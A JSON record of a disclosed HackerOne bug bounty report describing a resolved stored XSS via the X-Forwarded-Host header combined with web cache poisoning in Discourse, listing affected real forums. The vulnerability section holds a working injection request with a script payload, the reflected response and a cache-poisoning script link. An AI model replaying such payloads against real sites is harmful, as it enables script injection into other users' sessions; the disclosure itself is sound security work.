@@ -1,0 +1,228 @@
+{
+  "id": 394016,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTQwMTY=",
+  "url": "https://hackerone.com/reports/394016",
+  "title": "Web Cache Deception Attack (XSS)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-08-13T06:04:57.161Z",
+  "submitted_at": "2018-08-13T06:04:57.161Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bobrov",
+    "url": "/bobrov",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16893,
+    "url": "https://hackerone.com/discourse",
+    "handle": "discourse",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Discourse",
+      "twitter_handle": "discourse",
+      "website": "https://discourse.org",
+      "about": "Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-11-18T07:09:41.188Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-19T07:09:36.947Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "This XSS does not affect the try.discourse.org, but worked on many other Discourse instances, that i tested. In discussions with the Mozilla team, we came to the conclusion that this is a vulnerability in the Discourse and it needs to be sent through this program.\nList of vulnerable hosts:\n```\ndiscourse.mozilla.org\nforum.learning.mozilla.org\nforum.glasswire.com\nhelp.nextcloud.com\nmeta.discourse.org\n```\n\nDescription XSS\n===\nThe Web application is vulnerable to XSS through the X-Forwarded-Host header. \n\n**Vulnerable code**\nhttps://github.com/discourse/discourse/blob/master/app/views/common/_special_font_face.html.erb#L12-L18\n```\n<% woff2_url = \"#{asset_path(\"fontawesome-webfont.woff2\")}?#{font_domain}&v=4.7.0\".html_safe %>\n\n<link rel=\"preload\" href=\"<%=woff2_url%>\" as=\"font\" type=\"font/woff2\" crossorigin />\n...\n    src: url('<%=woff2_url %>') format('woff2'),\n```\n\n\n\n\n**HTTP Request**\n```http\nGET /?xx HTTP/1.1\nHost: meta.discourse.org\nX-Forwarded-Host: cacheattack'\"><script>alert(document.domain)</script>\n```\n\n**HTTP Response**\n```html\n<link rel=\"preload\" \n   href=\"https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'\">\n   <script>alert(document.domain)</script>\n   &2&v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin />\n<style>\n  @font-face {\n    font-family: 'FontAwesome';\n    src: url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'\">\n    <script>alert(document.domain)</script>\n    &2&v=4.7.0') format('woff2'),\n         url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-ba0c59deb5450f5cb41b3f93609ee2d0d995415877ddfa223e8a8a7533474f07.woff?https://cacheattack&#39;&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&amp;2&v=4.7.0') format('woff');\n  }\n</style>\n```\n\nWeb Cache Deception\n===\nAlso, the application caches the HTTP response for 1 minute, so if you send an HTTP request with XSS payload, it will be cached and will be displayed for all requests when the headers match:\nRequest Start Line, Accept, Accept-Encoding.\n\n**Steps To Reproduce**\nFor a simpler demonstration, I wrote a script.\nThe script takes the necessary headers from the request and poisons the cache.\nYou just need to open the cached page.\n\n1) Open URL\n```\nhttps://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60\n```\n2) Open the cached URL that the script displays.\n\n3) Result\n\n{F332797}\n\n## Impact\n\nAttacker can collect the popular combinations of Accep + Accept-Encoding and poison the cache of the web pages every minute.\nThe impact is like a stored XSS on any page.",
+  "bounty_amount": "256.0",
+  "formatted_bounty": "$256",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 332797,
+      "file_name": "Screenshot_at_10-00-49.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/332/797/86697ee9723c903d3698983fe2aaf4ef47183b0e/Screenshot_at_10-00-49.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_10-00-49.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_10-00-49.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6GV5B44G%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T055643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEzS910Pk5MSbM25u4%2BcgL4NEZXyUptfPrsyFpoBcqWKAiEAvdZmggq98aW5IsYFmg5CT%2FdS%2BW7T11k4XOORMhtB%2B%2FYqsQUIfhADGgwwMTM2MTkyNzQ4NDkiDG7XhSxHEcQHk9y3ByqOBS8Eneccwnym%2FrvhTYZriMVmSY7WmV0bPO5%2B2TbjOrpT5uihndhYPo6R1g3I8u2bfbnrPyjaRELi7fgzZjHJJUCl2Q7As%2FA21%2BnMYyHgXs35Qd%2FXOsCrT5jOiAVrsfFkD0cl%2BR7EexUtYAB6RBIf5JWhaUuhJ2qDD3KAkHqqpEmJrz4yNL31h9sGBZg86LKXVj2RDX0xM7C12abXwy9o8ns3Ji001Zbn%2B9aDBRY0lnYd40iw7IOUT6gm7BJm2Idls0QgK1DqF2wIVjbNBwVr1FNT1Aw7yWrieN9HS%2BbNZfX%2FKQ5ZGAwOzOyjJFPE1bqKDQTiVN4OndolYZ5FxAIGYdn47F6LD0JwWkzZSY4KbaEjUwIgy73XCNG2JTvK8O4u0HkjXaHT2RTJxTLX8fWxT6lVhXYSUe5j%2FwnItLPXTLf%2F8AU1y8C3Z5aD5k%2FgB%2BGtr4BsfWmArEiw%2FAh8dsD11uPBH1cYJ4wSx3qku5zE7EjrVJWwMWO1qsHeLmKrIjvOThzMT5Rc%2FtcOEstRWyjGfiD2ob7GMmsRt%2B5DYxAeN3Oo72COZ3TnramhKDR1chZ9a15W49AH0Umk87UgY4geTbFaiHyMD2VjJSJphdHhjmPy2%2FM1UJQq7%2BEfAx5VcyHH7KETXqbYuSMEaFZG9B1koTmze7%2BKW%2BZSNFuHXLzwADf8ivmPTqoP1DD0XKRkBYLBrYyV1atOKmZm8NQ%2FiyB6j3ACapBpqhfzlw5zE0ATxnJsOyqU%2BRrAWBB1Mpc6Rba9zY9K%2BeE9%2FWFcrs9TciU9UT1e0Fm3zdkdXQzo%2Fdchs0DmeGdKifrLihkghh%2FUiXpBnCoJA51h03yqoQRPdXDVwQVcrDSOiW9YJA5h1lfJLTDzrbfSBjqxAfGLFz64r2jtOIddBP9cmlhhw4nZ1tm0howAf%2FzXPMaWPpqmYzk7fYgxP5WCMq1pPyfm4VD5v1IJTt%2FJdn6R1yEBmq%2FebtlcUFzp2NN09R6T4IMvGONR8kcZhXZQ6Egf6m8vXZcPBLMDwAcdmOdtAKD%2FnHFx%2FEsbwX7X71MLW81NCKIP%2FkH3L%2BZG5EU4enjnOGnX6cnNp5CR%2F%2F9rnxbnY9rvWwYxst0ueBu%2FwGcgiTn2yQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c2e135bd34783a4a8658a980f33c73ddbc3ca95ff56a8af2887d17a930c7ca41",
+      "file_size": 9357,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-11-18T07:09:36.976Z",
+  "allow_singular_disclosure_after": -240965226.25815046,
+  "singular_disclosure_allowed": true,
+  "vote_count": 51,
+  "voters": [
+    "defenderwww",
+    "he4am",
+    "sourc7",
+    "base_64",
+    "bobrov",
+    "ali",
+    "ras-it",
+    "sameerphad72",
+    "nischalxd",
+    "mohaned0101",
+    "and 41 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 11850,
+      "category": "researcher",
+      "content": "* Web Cache Poisoning\n===",
+      "updated_at": "2018-11-21T15:03:26.163Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 2205,
+        "username": "bobrov",
+        "name": "Sergey Bobrov",
+        "bio": "@Black2Fan",
+        "cleared": false,
+        "verified": false,
+        "website": "https://twitter.com/Black2Fan",
+        "location": "Russia",
+        "created_at": "2014-01-14T04:31:42.053Z",
+        "url": "https://hackerone.com/bobrov",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/8f5393bb06e000811ac3ac31f77f5ce1d049785766c3d25a25cec97adaa9cc12",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eab7e558a2bc3ec841c51b96524419e712978d371ddb665048a3154ab05197fc"
+        }
+      }
+    }
+  ],
+  "databaseId": "394016",
+  "votes": 51,
+  "latest_disclosable_activity_at": "2018-11-18T07:09:41.201Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:56:43.341862",
+    "source": "https://hackerone.com/reports/394016.json",
+    "report_id": 394016
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTQwMTY=",
+    "databaseId": "394016",
+    "title": "Web Cache Deception Attack (XSS)",
+    "url": "https://hackerone.com/reports/394016",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2018-11-18T07:09:41.188Z",
+    "created_at": "2018-08-13T06:04:57.161Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzYy",
+      "name": "Cross-site Scripting (XSS) - Stored",
+      "external_id": "cwe-79"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "bobrov"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE2ODkz",
+      "handle": "discourse",
+      "name": "Discourse",
+      "url": "https://hackerone.com/discourse",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS85NjM3NA==",
+            "amount": "256.00",
+            "awarded_amount": "256.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2018-08-13T21:27:41.382Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM5NDAxNg==",
+    "_id": "394016",
+    "disclosed": true,
+    "votes": 51,
+    "latest_disclosable_activity_at": "2018-11-18T07:09:41.201Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTQwMTY=",
+      "databaseId": "394016",
+      "title": "Web Cache Deception Attack (XSS)",
+      "url": "https://hackerone.com/reports/394016",
+      "disclosed_at": "2018-11-18T07:09:41.188Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE2ODkz",
+      "handle": "discourse",
+      "name": "Discourse",
+      "url": "https://hackerone.com/discourse",
+      "currency": "usd"
+    }
+  }
+}
